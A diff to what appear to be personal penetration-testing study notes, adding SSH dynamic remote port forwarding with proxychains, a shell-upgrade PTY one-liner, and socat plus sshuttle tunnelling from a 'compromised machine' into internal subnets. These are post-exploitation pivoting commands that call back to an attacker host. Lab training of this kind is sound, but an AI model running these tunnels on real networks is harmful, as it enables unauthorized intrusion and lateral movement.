@@ -251,4 +251,17 @@ SSH Remote Port Forwarding:
         
         python3 -c 'import pty;pty.spawn("/bin/bash")'
         ssh -N -R 127.0.0.1:2345:10.4.200.215:5432 shaleph@192.168.45.193
+SSH Dynamic Remoet Port Forwarding:
+    first change proxychains :
         
+        sudo nano /etc/proxychains4.conf
+        socks5 127.0.0.1 9998 (on last line)
+    Then on compromised machine:
+        python3 -c 'import pty;pty.spawn("/bin/bash")'
+        ssh -N -R 9998 sshaleph@192.168.45.225
+Using SSHUTTLE:
+    first we set up socat on compromised machine (requers root ssh and root python pty) and next:
+    
+        socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
+        sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
+    
